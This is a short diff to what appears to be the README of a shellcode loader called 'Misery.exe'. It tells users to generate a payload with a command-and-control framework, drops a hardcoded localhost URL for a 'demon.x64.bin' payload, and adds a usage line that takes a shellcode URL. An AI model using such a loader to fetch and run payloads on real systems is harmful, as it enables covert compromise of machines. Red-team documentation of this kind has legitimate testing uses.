@@ -12,7 +12,9 @@
 
 ### 📁 Generate the payload with the c2 of your choice(*.bin)
 ### 🥷 If you want debug output, uncomment all printf lines
-### 🏷️Change line 268 -> LPCWSTR szUrl = L"http://127.0.0.1/demon.x64.bin"
+---
+## Usage
+### Misery.exe --shelcode <URL>
 
 
 
